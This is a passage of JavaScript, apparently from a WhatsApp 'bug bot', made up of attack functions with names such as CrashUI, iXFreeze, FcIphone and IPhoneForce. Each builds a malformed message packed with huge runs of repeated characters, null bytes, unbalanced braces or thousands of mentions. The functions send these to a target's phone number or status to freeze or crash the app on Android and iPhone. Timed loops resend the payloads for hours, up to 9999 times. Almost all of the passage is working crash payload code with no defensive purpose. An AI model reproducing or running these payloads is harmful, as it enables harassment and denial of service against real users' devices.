              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

    await sock.relayMessage("status@broadcast", xvzz.message, {
      messageId: xvzz.key?.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }],
            },
          ],
        },
      ],
    });

  await sock.relayMessage("status@broadcast", warux.message, {
    messageId: warux.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  await sock.relayMessage("status@broadcast", warux2ViewOnce.message, {
    messageId: warux2ViewOnce.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function TrdxtCountV4(duration, target) {
  const totalDuration = duration * 60 * 60 * 1000;
  const startTime = Date.now();
  let amount = 0;
  let maxSend = 9999;
  let delay = "1s";

  const parseDelay = (input) => {
    if (typeof input === "number") return input;

    const num = parseInt(input);
    if (input.endsWith("s")) return num * 1000;
    if (input.endsWith("m")) return num * 60 * 1000;
    if (input.endsWith("h")) return num * 60 * 60 * 1000;

    return 5000;
  };

  const delayMs = parseDelay(delay);

  const nextMessage = async () => {
    if (Date.now() - startTime >= totalDuration) {
      console.log(chalk.blue(`Succes Sending Bug Delay To ${target}`));
      return;
    }

    if (amount < maxSend) {
      await ExploitDelayV1(sock, target);

      amount++;
      console.log(chalk.blue(`Succes Sending Bug Delay To ${target}`));

      setTimeout(nextMessage, delayMs);

    } else {
      console.log(chalk.blue(`Succes Sending Bug Delay To ${target}`));
      amount = 0;

      console.log(chalk.blue(`Succes Sending Bug Delay To ${target}`));

      setTimeout(nextMessage, delayMs);
    }
  };

  nextMessage();
}

async function ExploitDelayV1(sock, target) {
  for (let i = 0; i < 10; i++) {
    const push = [];
    const buttons = [];

    for (let j = 0; j < 10; j++) {
      buttons.push({
        name: 'galaxy_message',
        buttonParamsJson: JSON.stringify({
          header: 'null',
          body: '\u0000'.repeat(10000),
          flow_action: 'navigate',
          flow_action_payload: { screen: 'FORM_SCREEN' },
          flow_cta: '\u0000'.repeat(10000),
          flow_id: '1169834181134583',
          flow_message_version: '3',
          flow_token: 'AQAAAAACS5FpgQ_cAAAAAE0QI3s',
        }),
      });
    }

    for (let k = 0; k < 10; k++) {
      push.push({
        body: { text: '𖣂᳟᪳' },
        footer: { text: '' },
        header: {
          title: 'ꦽ'.repeat(2000),
          hasMediaAttachment: true,
          imageMessage: {
            url: 'https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc',
            mimetype: 'image/jpeg',
            fileSha256: 'dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=',
            fileLength: '99999',
            height: 0,
            width: 0,
            mediaKey: 'LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=',
            fileEncSha256: 'G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=',
            directPath: '/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc',
            mediaKeyTimestamp: '1721344123'
          },
        },
        nativeFlowMessage: { buttons },
      });
    }

    const synxtax = generateWAMessageFromContent(
      target,
      {
        interactiveMessage: {
          body: { text: '\u0000' },
          footer: { text: '‌᪳' },
          syntaxMessage: { cards: push },
        }
      },
      { userJid: target }
    );

    await sock.relayMessage(
      target,
      { groupStatusMessageV2: { message: synxtax.message } },
      {
        messageId: synxtax.key.id,
        participant: { jid: target },
      }
    );
  }

  const Msgx = {
  interactiveResponseMessage: {
    contextInfo: {
      mentionedJid: Array.from(
        { length: 1900 },
        (_, r) => `6285983729${r + 1}@s.whatsapp.net`
      ),
      isForwarded: true,
      forwardingScore: 7205,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "1@newsletter",
        newsletterName: "ꦽ".repeat(2000),
        serverMessageId: 1,
        accessibilityText: null,
      },
      statusAttributionType: "RESHARED_FROM_MENTION",
      contactVcard: true,
      isSampled: true,
      disappearingMode: {
        initiator: target,
        initiatedByMe: true,
      },
      expiration: Date.now(),
    },
    body: {
      text: "X",
      format: "DEFAULT",
    },
    nativeFlowResponseMessage: {
      name: "cta_call",
      paramsJson: `{\"display_text\":\"${"\u0000".repeat(150000)}\",\"phone_number\":\"00000000000000\"}`,
      version: 3,
    },
  },
};

  const xvzz = await generateWAMessageFromContent(target, Msgx, {
    userJid: target,
  });

  await sock.relayMessage(
    target,
    { groupStatusMessageV2: { message: xvzz.message } },
    {
      messageId: xvzz.key.id,
      participant: { jid: target },
    }
  );

  const Track = {
    interactiveResponseMessage: {
      header: {
        title: "X" + "{{".repeat(2500)
      },
      body: { text: "X" },
      nativeFlowResponseMessage: {
        name: "call_permision_request",
        paramsJson: "\x10" + "\u0000".repeat(150000),
        version: 3,
      },
      contextInfo: {
        urlTrackingMap: {
          urlTrackingMapElements: Array.from({ length: 20500 }, () => ({}))
        }
      }
    }
  };

  const msg1 = await generateWAMessageFromContent(target, Track, {
    userJid: target,
  });

  const Location = {
    interactiveResponseMessage: {
      header: {
        title: "X" + "{{".repeat(2500)
      },
      body: { text: "X" },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: "\x10" + "\u0000".repeat(150000),
        version: 3,
      },
      contextInfo: {
        urlTrackingMap: {
          urlTrackingMapElements: Array.from({ length: 20500 }, () => ({}))
        }
      }
    }
  };

  const msg2 = await generateWAMessageFromContent(target, Location, {
    userJid: target,
  });

  for (const msg of [msg1, msg2]) {
    await sock.relayMessage(
      target,
      { groupStatusMessageV2: { message: msg.message } },
      {
        messageId: msg.key.id,
        participant: { jid: target },
      }
    );
  }
}

//=====( Blank Android )=====\\

async function iXFreeze(sock, target) {
   const freecStc = {
      viewOnceMessage: {
         message: {
            interactiveMessage: {
               header: {
                  hasMediaAttachment: true,
                  locationMessage: {
                     degreesLatitude: -53093836.13093836,
                     degreesLongitude: 70059078.10059078,
                     name: "𖣂᳟༑ᜌ ̬ ͠⤻𝐓𝐫𝐞𝐯𝐨𝐬𝐢𝐮𝐦 𝐈𝐬 𝐇𝐞𝐫𝐞 ᭨" + "ꦾ".repeat(88888),
                     address: "ꦾ".repeat(12300) + "ꦽ".repeat(35000),
                     url: "https://maps.google.com/" + "ꦾ".repeat(77777),
                     isLive: false,
                     accuracyInMeters: 10,
                     speedInMps: 0,
                     degreesClockwiseFromMagneticNorth: 0,
                     comment: "\u0000".repeat(104500),
                     jpegThumbnail: null
                  }
               },
               body: {
                  text: "𖣂᳟༑ᜌ ̬ ͠⤻𝐓𝐫𝐞𝐯𝐨𝐬𝐢𝐮𝐦 𝐈𝐬 𝐇𝐞𝐫𝐞 ᭨᳟᪳"
               },
               nativeFlowMessage: {
                  buttons: [
                     {
                        name: "single_select",
                        buttonParamsJson: "{}"
                     },
                     {
                        name: "cta_call",
                        buttonParamsJson: JSON.stringify({
                           display_text: "ꦽ".repeat(5000)
                        })
                     },
                     {
                        name: "cta_copy",
                        buttonParamsJson: JSON.stringify({
                           display_text: "ꦽ".repeat(5000)
                        })
                     },
                     {
                        name: "cta_url",
                        buttonParamsJson: JSON.stringify({
                           display_text: "ꦾ".repeat(5000)
                        })
                     },
                     {
                        name: "galaxy_message",
                        buttonParamsJson: JSON.stringify({
                           display_text: "ꦾ".repeat(5000)
                        })
                     }
                  ],
                  messageParamsJson: "[{".repeat(10000)
               },
               contextInfo: {
                  mentionedJid: [
                     "0@s.whatsapp.net",
                     ...Array.from({ length: 1900 }, () =>
                        "1" + Math.floor(Math.random() * 50000000) + "0@s.whatsapp.net"
                     )
                  ],
                  quotedMessage: {
                     paymentInviteMessage: {
                        serviceType: 3,
                        expiryTimeStamp: Date.now() + 1814400000
                     }
                  }
               }
            }
         }
      }
   };

   await sock.relayMessage(target, freecStc, {
      messageId: sock.generateMessageTag(),
      participant: { jid: target }
   });

   const msg2 = {
      extendedTextMessage: {
         text: "𖣂᳟༑ᜌ ̬ ͠⤻𝐓𝐫𝐞𝐯𝐨𝐬𝐢𝐮𝐦 𝐈𝐬 𝐇𝐞𝐫𝐞 ᭨",
         paymentLinkMetadata: {
            button: {
               displayText: "ꦾ࣯࣯".repeat(15000) + "ꦽ".repeat(35000)
            },
            header: {
               headerType: 1
            },
            provider: {
               paramsJson: "{".repeat(70000)
            }
         }
      }
   };

   await sock.relayMessage(target, msg2, {
      messageId: sock.generateMessageTag(),
      participant: { jid: target }
   });

   const msg1 = {
      stickerMessage: {
         url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
         fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
         fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
         mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
         mimetype: "image/webp",
         directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
         fileLength: 1,
         mediaKeyTimestamp: Date.now(),
         firstFrameLength: 19904,
         firstFrameSidecar: "KN4kQ5pyABRAgA==",
         isAnimated: true,
         contextInfo: {
            remoteJid: target,
            participant: "0@s.whatsapp.net",
            stanzaId: "1234567890ABCDEF",
            mentionedJid: Array.from(
               { length: 1900 },
               () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
            )
         },
         stickerSentTs: Date.now(),
         isAvatar: false,
         isAiSticker: false,
         isLottie: false
      }
   };

   await sock.relayMessage(target, msg1, {
      messageId: sock.generateMessageTag(),
      participant: { jid: target }
   });
}

//=====( Crash Ui )=====\\
async function BlankNotiffButton(sock, target) {
  const buttonnotif = [
    {
      buttonId: "XvZz",
      buttonText: {
        displayText: "𑜦𑜠" + "ꦾ".repeat(2500)
      },
      type: 1
    },
    {
      buttonId: "XvZz",
      buttonText: {
        displayText: "𑜦𑜠" + "ꦽ".repeat(2500)
      },
      type: 1
    },
    {
      buttonId: "XvZz",
      buttonText: {
        displayText: "ꦾ".repeat(2500)
      },
      type: 1
    },
    {
      buttonId: "XvZz",
      buttonText: {
        displayText: "ꦾ".repeat(2500)
      },
      type: 1
    },
    {
      buttonId: "XvZz",
      buttonText: {
        displayText: "ꦽ".repeat(2500)
      },
      type: 1
    }
  ];

 const mbgbutton = {
   buttonsMessage: {
        contentText: "ꦾ".repeat(30000),
        footerText: "ꦽ".repeat(30000),
        buttons: buttonnotif,
      headerType: 1
    }
  };
  
  await sock.relayMessage(target, mbgbutton, {
    messageId: sock.generateMessageTag(),
    participant: { jid: target }
  });
}

async function xCNFSCREENATK(sock, target) {
  await sock.relayMessage(target, {
    locationMessage: {
      degreesLatitude: -1e308,
      degreesLongitude: 1e308,
      name: "🩸⃟𝘛𝘳𝘦𝘷𝘰𝘴𝘪𝘶𝘮 𝘈𝘵𝘵𝘢𝘤𝘬 𝘠𝘰uᬊ" + "ꦾ࣯࣯".repeat(5000),
      address: "ꦽ࣯࣯".repeat(25000) + "ꦽ࣯࣯".repeat(15000),
      jpegThumbnail: null,
      isLive: true,
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        fromMe: false,
        mentionedJid: [target]
      }
    }
  }, { messageId: null, participant: { jid: target } });
}

async function ATRUi(sock, target) {
  const msg = {
    viewOnceMessage: {
      message: {
        buttonsMessage: {
          text: "🩸⃟𝘛𝘳𝘦𝘷𝘰𝘴𝘪𝘶𝘮 𝘈𝘵𝘵𝘢𝘤𝘬 𝘠𝘰uᬊ",
          contentText: "ꦽ".repeat(25000) + "ꦽ".repeat(1000),
          contextInfo: {
            forwardingScore: 666,
            isForwarded: true,
            urlTrackingMap: {
              urlTrackingMapElements: [
                {
                  originalUrl: "https://t.me/Xavienzz",
                  unconsentedUsersUrl: "https://t.me/" + "ꦽ".repeat(3000),
                  consentedUsersUrl: "https://t.me/" + "ꦽ".repeat(3000),
                  cardIndex: 1,
                },
                {
                  originalUrl: "https://t.me/Xavienzz",
                  unconsentedUsersUrl: "https://t.me/" + "ꦽ".repeat(3000),
                  consentedUsersUrl: "https://t.me/" + "ꦽ".repeat(3000),
                  cardIndex: 2,
                },
              ],
            },
            quotedMessage: {
              interactiveResponseMessage: {
                body: {
                  text: " 🩸⃟𝘛𝘳𝘦𝘷𝘰𝘴𝘪𝘶𝘮 𝘈𝘵𝘵𝘢𝘤𝘬 𝘠𝘰uᬊ ",
                  format: "EXTENSIONS_1"
                },
                nativeFlowResponseMessage: {
                  name: "address_message",
                  paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"xrl\",\"tower_number\":\"relly\",\"city\":\"markzuckerberg\",\"name\":\"fucker\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"X${"\u0000".repeat(145000)}\"}}`,
                  version: 3
                }
              }
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg, {
    messageId: null,
    participant: { jid: target }
  });

  console.log(`Succes Sending Bug Crashui To ${target}`);
}

async function UiZenifer(sock, target) {
    const msg = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: {
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: 999,
                            businessMessageForwardInfo: {
                                businessOwnerJid: target,
                            },
                        },
                        body: {
                            text: "🩸⃟𝘛𝘳𝘦𝘷𝘰𝘴𝘪𝘶𝘮 𝘈𝘵𝘵𝘢𝘤𝘬 𝘠𝘰uᬊ" + "ꦽ".repeat(20000),
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{".repeat(10000),
                        },
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: "\u0000".repeat(20000),
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "\u0000".repeat(20000),
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "\u0000".repeat(20000),
                            },
                        ],
                    },
                },
            },
        },
        {}
    );
    
    const msg2 = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "🩸⃟𝘛𝘳𝘦𝘷𝘰𝘴𝘪𝘶𝘮 𝘈𝘵𝘵𝘢𝘤𝘬 𝘠𝘰uᬊ",
                            hasMediaAttachment: false,
                            locationMessage: {
                                degreesLatitude: -999.03499999999999,
                                degreesLongitude: 922.999999999999,
                                name: "🩸⃟𝘛𝘳𝘦𝘷𝘰𝘴𝘪𝘶𝘮 𝘈𝘵𝘵𝘢𝘤𝘬 𝘠𝘰uᬊ",
                                address: "ꦽ".repeat(25000) + "ꦾ࣯".repeat(15000) + "ោ៝".repeat(15000),
                            }, 
                        },
                        body: {
                            text: "🩸⃟𝘛𝘳𝘦𝘷𝘰𝘴𝘪𝘶𝘮 𝘈𝘵𝘵𝘢𝘤𝘬 𝘠𝘰uᬊ" + "ꦾ࣯".repeat(20000),
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{".repeat(10000),
                        },
                    },
                },
            },
        },
        {}
    );

    await sock.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id
    });

    await sock.relayMessage(target, msg2.message, {
        participant: { jid: target },
        messageId: msg2.key.id
    });
}

async function CrashUI(sock, target) {
  try {
    await sock.relayMessage(target, {
      extendedTextMessage: {
        text: "🩸⃟𝘛𝘳𝘦𝘷𝘰𝘴𝘪𝘶𝘮 𝘈𝘵𝘵𝘢𝘤𝘬 𝘠𝘰uᬊ" + "ꦾ࣯࣯".repeat(6500) + "@1313555003".repeat(50000),
        contextInfo: {
          mentionedJid: [target],
          participant: target,
          forwardingScore: 9471,
          isForwarded: true,
          fromMe: false,
        }
      }
    }, { messageId: null, participant: { jid: target } });
    await new Promise((r) => setTimeout(r, 2500));
    await sock.relayMessage(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              locationMessage: {
                degreesLatitude: -992.999999999,
                degreesLongitude: 123.456789999,
              },
              hasMediaAttachment: true
            },
            contextInfo: {
              remoteJid: "status@broadcast",
              quotedMessage: {
                paymentInviteMessage: 2,
                expiryTimestamp: 8 * 1840000
              }
            },
            body: {
              text: "🩸⃟𝘛𝘳𝘦𝘷𝘰𝘴𝘪𝘶𝘮 𝘈𝘵𝘵𝘢𝘤𝘬 𝘠𝘰uᬊ" + "ꦾ࣯࣯".repeat(2500) +  "ꦽ".repeat(2500) + "@0".repeat(50000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: [{
                name: 'cta_url',
                buttonParamsJson: JSON.stringify({
                  status: true
                })
              }, {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({
                  status: true
                })
              }]
            }
          }
        }
      }
    }, { messageId: null, participant: { jid: target } });
  } catch (r) {
    console.log(r);
  }
}

async function killeruimsg(sock, target) {
  const msg = {
    viewOnceMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            title: "🩸⃟𝘛𝘳𝘦𝘷𝘰𝘴𝘪𝘶𝘮 𝘈𝘵𝘵𝘢𝘤𝘬 𝘠𝘰uᬊ",
            hasMediaAttachment: false
          },
          body: {
            text: "ꦾ".repeat(60000) + "ោ៝".repeat(20000),
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "",
              },
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(5000),
                }),
              },
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(5000),
                }),
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(5000),
                }),                         
              },
            ],
            messageParamsJson: "[{".repeat(10000),
          },
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 50000000) + "0@s.whatsapp.net",
              ),
            ],
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000,
              },
            },
          },
        },
      },
    },
  };

  const mgsui = {
    viewOnceMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            title: "🩸⃟𝘛𝘳𝘦𝘷𝘰𝘴𝘪𝘶𝘮 𝘈𝘵𝘵𝘢𝘤𝘬 𝘠𝘰uᬊ",
            hasMediaAttachment: false,
          },
          body: {
            text: "🩸⃟𝘛𝘳𝘦𝘷𝘰𝘴𝘪𝘶𝘮 𝘈𝘵𝘵𝘢𝘤𝘬 𝘠𝘰uᬊ" +
                   "꧀".repeat(10000) + 
                   "ꦽ".repeat(30000),
          },
          footer: {
            text: '🩸⃟𝘛𝘳𝘦𝘷𝘰𝘴𝘪𝘶𝘮 𝘈𝘵𝘵𝘢𝘤𝘬 𝘠𝘰uᬊ' + '@1'.repeat(10000)
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "",
              },
              {
                name: "cta_catalog",
                buttonParamsJson: "",
              },
              {
                name: "call_permission_request",
                buttonParamsJson: ".",
              },
              {
                name: "cta_url",
                buttonParamsJson: "\u0003",
              },
            ],
            messageParamsJson: "{[".repeat(10000),
          },
          contextInfo: {
            stanzaId: "Xavienz.Archive-id" + Date.now(),
            isForwarded: true,
            forwardingScore: 999,
            participant: target,
            remoteJid: "0@s.whatsapp.net",
            mentionedJid: ["0@s.whatsapp.net"],
            quotedMessage: {
              groupInviteMessage: {
                groupJid: "9919192929@g.us",
                groupName: "ꦽ".repeat(20000),
                inviteExpiration: Date.now() + 181440000000,
                caption: "Trevosium Is Here",
                jpegThumbnail: null,
              },
            },
          },
        },
      },
    },
  };
  
  await sock.relayMessage(target, msg, { messageId: Date.now().toString() });
  await sock.relayMessage(target, mgsui, { messageId: (Date.now() + 1).toString() });
}

//====( Invisible iPhone )=====\\

async function TrdxtCountV6(duration, target) {
  const totalDuration = duration * 60 * 60 * 1000;
  const startTime = Date.now();
  let amount = 0;
  let maxSend = 9999;
  let delay = "1s";

  const parseDelay = (input) => {
    if (typeof input === "number") return input;

    const num = parseInt(input);
    if (input.endsWith("s")) return num * 1000;
    if (input.endsWith("m")) return num * 60 * 1000;
    if (input.endsWith("h")) return num * 60 * 60 * 1000;

    return 5000;
  };

  const delayMs = parseDelay(delay);

  const nextMessage = async () => {
    if (Date.now() - startTime >= totalDuration) {
      console.log(chalk.red(`Succes Sending Bug Forclose Ios To ${target}`));
      return;
    }

    if (amount < maxSend) {
      await FcIphone(sock, target);
      await VnXCrashIos(sock, target)

      amount++;
      console.log(chalk.red(`Succes Sending Bug Forclose Ios To ${target}`));

      setTimeout(nextMessage, delayMs);

    } else {
      console.log(chalk.red(`Succes Sending Bug Forclose Ios To ${target}`));
      amount = 0;

      console.log(chalk.red(`Succes Sending Bug Forclose Ios To ${target}`));

      setTimeout(nextMessage, delayMs);
    }
  };

  nextMessage();
}

async function FcIphone(sock, target) {
  const x = "BEGIN:CARD";
  const r = (s, n) => s.repeat(n);
  await sock.relayMessage("status@broadcast", {
    contactMessage: {
      displayName: x + r("𑇂𑆵𑆴𑆿", 1e4),
      vcard: `BEGIN:VCARD\nVERSION:1.0\nN:;${x}${r("𑇂𑆵𑆴𑆿", 1e4)};;;\nFN:${x}${r("𑇂𑆵𑆴𑆿", 1e4)}\nNICKNAME:${x}${r("ᩫᩫ", 4e3)}\nORG:${x}${r("ᩫᩫ", 4e3)}\nTITLE:${x}${r("ᩫᩫ", 4e3)}\nitem1.TEL;waid=6287873499996:+62 878-7349-9996\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:${x}${r("ᩫᩫ", 4e3)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:${x}${r("ᩫᩫ", 4e3)}\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:${x}${r("ᩫᩫ", 4e3)}\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;${x}${r("ᩫᩫ", 4e3)};;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:${x}${r("ᩫᩫ", 4e3)}\nPHOTO;BASE64:/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ//Z\nX-WA-BIZ-NAME:${x}${r("ᩫᩫ", 4e3)}\nEND:VCARD`,
      contextInfo: {
        participant: "status@broadcast",
        externalAdReply: {
          automatedGreetingMessageShown: true,
          automatedGreetingMessageCtaType: "\0".repeat(1e5),
          greetingMessageBody: "\0"
        }
      }
    }
  }, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: { status_setting: "allowlist" },
      content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target } }] }]
    }]
  });
}

async function VnXCrashIos(sock, target) {
    let mbgiosvnx = await generateWAMessageFromContent(
        target,
        {
         contactMessage: {
            displayName:
        "🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰtׁׅꭈׁׅꫀׁׅܻ᥎꫶ׁׅᨵׁׅ꯱ׁׅ֒ꪱׁׅυׁׅ ꩇ" + "𑇂𑆵𑆴𑆿".repeat(25000),
            vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰtׁׅꭈׁׅꫀׁׅܻ᥎꫶ׁׅᨵׁׅ꯱ׁׅ֒ꪱׁׅυׁׅ ꩇ${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰtׁׅꭈׁׅꫀׁׅܻ᥎꫶ׁׅᨵׁׅ꯱ׁׅ֒ꪱׁׅυׁׅ ꩇ${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰtׁׅꭈׁׅꫀׁׅܻ᥎꫶ׁׅᨵׁׅ꯱ׁׅ֒ꪱׁׅυׁׅ ꩇ${"ᩫᩫ".repeat(4000)}\nORG:🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰtׁׅꭈׁׅꫀׁׅܻ᥎꫶ׁׅᨵׁׅ꯱ׁׅ֒ꪱׁׅυׁׅ ꩇ${"ᩫᩫ".repeat(4000)}\nTITLE:🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰtׁׅꭈׁׅꫀׁׅܻ᥎꫶ׁׅᨵׁׅ꯱ׁׅ֒ꪱׁׅυׁׅ ꩇ${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 813-1919-9692\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰtׁׅꭈׁׅꫀׁׅܻ᥎꫶ׁׅᨵׁׅ꯱ׁׅ֒ꪱׁׅυׁׅ ꩇ${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰtׁׅꭈׁׅꫀׁׅܻ᥎꫶ׁׅᨵׁׅ꯱ׁׅ֒ꪱׁׅυׁׅ ꩇ${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
                contextInfo: {
                    stanzaId: "X",
                    mentionedJid: [target], 
                    isForwarded: true,
                    forwardingScore: 9999,
                    interactiveAnnotations: [{
                        polygonVertices: [
                            { x: 0.05625700578093529, y: 0.1530572921037674 },
                            { x: 0.9437337517738342, y: 0.1530572921037674 },
                            { x: 0.9437337517738342, y: 0.8459166884422302 },
                            { x: 0.05625700578093529, y: 0.8459166884422302 }
                        ],
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "120363186130999681@newsletter",
                            serverMessageId: 1,
                            newsletterName: "sex null",
                            contentType: "UPDATE_CARD"
                        }
                    }]
                } 
            }
        },
        { userJid: sock.user.id, quoted: null }
    );

    await sock.relayMessage(
        "status@broadcast",
        mbgiosvnx.message,
        {
            messageId: mbgiosvnx.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined
                                }
                            ]
                        }
                    ]
                }
            ]
        }
    );
}


async function IPhoneForce(sock, target) {
  try {
    const msg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          locationMessage: {
            degreesLatitude: -66.666,
            degreesLongtitude: 66.666,
            name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
            address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
            jpegThumbnail: null,
            url: `https://t.me/${"𑇂𑆵𑆴𑆿".repeat(25000)}`,
            contextInfo: {
              participant: target,
              forwardingScore: 1,
              isForwarded: true,
              stanzaId: target,
              mentionedJid: [target]
            },
          },
        },
      },
    }, {});
    
   await sock.relayMessage(target, {
     requestPhoneNumberMessage: {
      contextInfo: {
       quotedMessage: {
        documentMessage: {
         url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
         mimetype: "application/pdf",
         fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
         fileLength: 0,
         pageCount: 0,
         mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
         fileName: "ven.pdf",
         fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
         directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
          mediaKeyTimestamp: 1737369406,
          caption: "X",
          title: "🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰtׁׅꭈׁׅꫀׁׅܻ᥎꫶ׁׅᨵׁׅ꯱ׁׅ֒ꪱׁׅυׁׅ ꩇ",
          mentionedJid: [target],
          }
        },
        externalAdReply: {
         title: "🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰtׁׅꭈׁׅꫀׁׅܻ᥎꫶ׁׅᨵׁׅ꯱ׁׅ֒ꪱׁׅυׁׅ ꩇ",
